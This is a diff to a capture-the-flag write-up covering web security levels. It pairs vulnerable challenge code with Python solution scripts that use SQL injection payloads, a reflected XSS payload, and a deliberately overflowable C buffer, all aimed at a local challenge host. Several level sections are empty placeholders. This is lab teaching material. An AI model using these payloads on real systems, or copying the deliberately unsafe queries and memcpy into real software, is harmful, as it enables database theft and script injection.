@@ -107,7 +107,7 @@ import requests
 
 form = { 
     "username" : 'flag" --', 
-    "password" : "idk", 
+    "password" : "w3th4nds", 
 } 
 
 response = requests.post("http://challenge.localhost/", data=form) 
@@ -128,3 +128,285 @@ def level5():
     return "".join(f'{user["username"]}\n' for user in users)
 ```
 
+```python
+import requests 
+
+params = {"query" : '" UNION SELECT password from USERS --'} 
+
+response = requests.post("http://challenge.localhost/", params=params) 
+
+print(response.text.strip())
+```
+
+### Level 6 - Exploit a structured query language injection vulnerability with an unknown database structure
+
+```python
+def level6():
+    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
+    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
+                'SELECT "flag" AS username, ? AS password'),
+               (flag,))
+
+    query = request.args.get("query", "%")
+    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
+```
+
+```python
+import requests 
+
+params = {"query": '" UNION SELECT tbl_name from sqlite_master --'} 
+
+response = requests.post("http://challenge.localhost/", params=params) 
+
+t_name = response.text.strip()
+
+params = {"query": f'" UNION SELECT password from {t_name} --' }
+
+response = requests.post("http://challenge.localhost/", params=params) 
+
+print(response.text.strip())
+```
+
+### Level 7 - Exploit a structured query language injection vulnerability to blindly leak data
+
+```python
+def level7():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? as password'),
+               (flag,))
+
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        assert username, "Missing `username` form"
+        assert password, "Missing `password` form"
+
+        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
+        assert user, "Invalid `username` or `password`"
+
+        session["user"] = int(user["rowid"])
+        return redirect(request.path)
+
+    if session.get("user"):
+        user_id = int(session.get("user", -1))
+        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
+        if user:
+            username = user["username"]
+            return f"Hello, {username}!\n"
+
+    return form(["username", "password"])
+```
+
+```python
+import requests 
+
+data = { 
+    "username" : "flag", 
+    "password" : '" UNION SELECT password, * FROM USERS --'
+} 
+
+response = requests.post("http://challenge.localhost/", data=data) 
+
+idx = response.text.strip().index('pwn')
+print(response.text[idx:-2])
+```
+
+### Level 8 - Exploit a cross site scripting vulnerability
+
+```python
+def level8():
+    if request.path == "/echo":
+        echo = request.args.get("echo")
+        assert echo, "Missing `echo` argument"
+        return html(echo)
+
+    if request.path == "/visit":
+        url = request.args.get("url")
+        assert url, "Missing `url` argument"
+
+        url_arg_parsed = urllib.parse.urlparse(url)
+        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"
+
+        with run_browser() as browser:
+            browser.get(url)
+            try:
+                WebDriverWait(browser, 1).until(EC.alert_is_present())
+            except TimeoutException:
+                return "Failed to alert\n"
+            else:
+                return f"{flag}\n"
+
+    return "Not Found\n", 404
+```
+
+```python
+import requests 
+import urllib.parse
+
+# Craft a URL where the hostname matches challenge_host
+url = f"http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=<script>alert(1)</script>"
+
+response = requests.get(url)
+
+print(response.text)
+```
+
+### Level 9 - Exploit a cross site scripting vulnerability with more complicated context
+
+```python
+def level9():
+    if request.path == "/echo":
+        echo = request.args.get("echo")
+        assert echo, "Missing `echo` argument"
+        return html(f"<textarea>{echo}</textarea>")
+
+    if request.path == "/visit":
+        url = request.args.get("url")
+        assert url, "Missing `url` argument"
+
+        url_arg_parsed = urllib.parse.urlparse(url)
+        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"
+
+        with run_browser() as browser:
+            browser.get(url)
+            try:
+                WebDriverWait(browser, 1).until(EC.alert_is_present())
+            except TimeoutException:
+                return "Failed to alert\n"
+            else:
+                return f"{flag}\n"
+
+    return "Not Found\n", 404
+```
+
+```python
+
+```
+
+### Level 10 - 
+
+```python
+
+```
+```python
+
+```
+
+### Level 11 - 
+
+```python
+
+```
+```python
+
+```
+
+### Level 12 - 
+
+```python
+
+```
+```python
+
+```
+
+### Level 13 - 
+
+```python
+
+```
+```python
+
+```
+
+### Level 14 - 
+
+```python
+
+```
+```python
+
+```
+
+### Level 15 - Exploit a (memory corruption) stack injection vulnerability
+
+```python
+def level15():
+    if "libgreet" not in globals():
+        global libgreet
+        shared_library_file = tempfile.NamedTemporaryFile("x", suffix=".so")
+        gcc_args = ["/usr/bin/gcc", "-x", "c", "-shared", "-fPIC", "-fno-stack-protector", "-o", shared_library_file.name, "-"]
+        subprocess.run(gcc_args, input=r"""
+        #include <unistd.h>
+        #include <fcntl.h>
+        #include <stdio.h>
+        #include <string.h>
+
+        void __attribute__ ((constructor)) disable_buffering(void) {
+          setvbuf(stdout, NULL, _IONBF, 0);
+        }
+
+        void win(void)
+        {
+          char flag[256] = { 0 };
+          int flag_fd;
+
+          puts("You win! Here is your flag:");
+
+          flag_fd = open("/flag", 0);
+          read(flag_fd, flag, sizeof(flag));
+          puts(flag);
+        }
+
+        void * win_address(void)
+        {
+          return win;
+        }
+
+        void greet(char *name, size_t length)
+        {
+          char buffer[256] = { 0 };
+
+          memcpy(buffer, "Hello, ", 7);
+          memcpy(buffer + 7, name, length);
+          memcpy(buffer + 7 + length, "!", 1);
+
+          puts(buffer);
+        }
+        """.encode())
+        libgreet = ctypes.CDLL(shared_library_file.name)
+        libgreet.win_address.restype = ctypes.c_void_p
+
+    if request.path == "/win_address":
+        return f"{hex(libgreet.win_address())}\n"
+
+    if request.path == "/greet":
+        name = request.args.get("name")
+        assert name, "Missing `name` argument"
+
+        def stream_greet():
+            r, w = os.pipe()
+            pid = os.fork()
+
+            if pid == 0:
+                os.close(r)
+                os.dup2(w, 1)
+                name_buffer = ctypes.create_string_buffer(name.encode("latin"))
+                libgreet.greet(name_buffer, len(name))
+                os._exit(0)
+
+            os.close(w)
+            while True:
+                data = os.read(r, 256)
+                if not data:
+                    break
+                yield data
+            os.wait()
+
+        return stream_greet()
+
+    return "Not Found\n", 404
+```
+```python
+
+```
